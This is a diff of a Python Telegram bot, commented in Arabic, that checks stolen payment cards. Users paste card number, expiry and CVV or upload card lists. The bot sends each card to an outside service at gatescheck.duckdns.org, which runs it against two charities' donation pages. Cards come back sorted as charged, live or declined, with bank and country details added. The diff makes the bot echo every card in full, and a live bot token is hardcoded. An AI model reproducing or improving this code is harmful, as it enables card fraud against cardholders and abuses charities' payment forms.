@@ -8,18 +8,15 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 TOKEN = '8610138136:AAHHtP1A21F3NdW6hcQHocpgkcd-GF2EE_U'
 
-API_URL = "http://gatescheck.duckdns.org:7000/check"
-
-# البوابات (تبديل تلقائي)
+# البوابات للتبديل التلقائي
 GATES = [
     "https://raybensch.com/donations/support-ray/",
     "https://www.wfft.org/donations/general-donation/"
 ]
-
 gate_index = 0
 stop_users = {}
 
-# تسريع
+# تسريع الفحص
 api_semaphore = asyncio.Semaphore(6)
 
 # ------------------- BIN Lookup -------------------
@@ -28,12 +25,10 @@ async def get_bin_info(bin_number):
         async with httpx.AsyncClient(timeout=10) as client:
             r = await client.get(f"https://lookup.binlist.net/{bin_number}")
             data = r.json()
-
             brand = data.get("scheme", "N/A")
             card_type = data.get("type", "N/A")
             bank = data.get("bank", {}).get("name", "N/A")
             country = data.get("country", {}).get("name", "N/A")
-
             return f"{brand} - {card_type}", bank, country
     except:
         return "N/A", "N/A", "N/A"
@@ -41,8 +36,6 @@ async def get_bin_info(bin_number):
 # ------------------- Check API -------------------
 async def check_card_api(card_full):
     global gate_index
-
-    # تبديل تلقائي بين البوابات
     gate = GATES[gate_index]
     gate_index = (gate_index + 1) % len(GATES)
 
@@ -55,15 +48,15 @@ async def check_card_api(card_full):
     async with api_semaphore:
         try:
             async with httpx.AsyncClient(timeout=20) as client:
-                r = await client.get(API_URL, params=params)
+                r = await client.get("http://gatescheck.duckdns.org:7000/check", params=params)
 
             result_raw = r.json().get('result', '')
             result = result_raw.lower()
 
             if "charge" in result or "success" in result:
-                return "approved", "Charge"
+                return "approved", result_raw
             elif "insufficient" in result:
-                return "live", "Insufficient Funds"
+                return "live", result_raw
             else:
                 return "declined", result_raw
 
@@ -100,7 +93,6 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     card_full = " ".join(context.args)
-
     if not card_full:
         await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
         return
@@ -126,7 +118,6 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     stop_users[user_id] = False
 
     os.makedirs("downloads", exist_ok=True)
-
     file = await update.message.document.get_file()
     file_path = f"downloads/{file.file_id}.txt"
     await file.download_to_drive(file_path)
@@ -147,11 +138,11 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             continue
 
         card_full = match[0]
-
         start_time = time.time()
         status, response = await check_card_api(card_full)
         taken = round(time.time() - start_time, 2)
 
+        # تحديث العدادات
         if status == "approved":
             approved += 1
         elif status == "live":
@@ -159,17 +150,28 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             declined += 1
 
-        if status in ["approved", "live"]:
-            text = await format_response(card_full, status, response, taken)
-            await update.message.reply_text(text)
+        # ارسال التفاصيل كاملة
+        text = await format_response(card_full, status, response, taken)
+        await update.message.reply_text(text)
 
+        # تحديث البانل كل 5 كروت
         if i % 5 == 0:
+            last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
             panel = f"""📊 Status
 
 ✅ Charge: {approved}
 🟢 Live: {live}
 ❌ Declined: {declined}
 📂 Total: {approved + live + declined}
+
+━━━━━━━━━━━━━━━
+💳 Last Card: {card_full}
+📨 Response: {response}
+🏦 Info: {last_info}
+🏛 Bank: {last_bank}
+🌍 Country: {last_country}
+📌 Status: {status}
+━━━━━━━━━━━━━━━
 
 ⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}
 """
@@ -189,12 +191,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ------------------- Run -------------------
 def main():
     app = Application.builder().token(TOKEN).build()
-
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("pp", pp))
     app.add_handler(CommandHandler("stop", stop))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
-
     app.run_polling()
 
 if __name__ == "__main__":
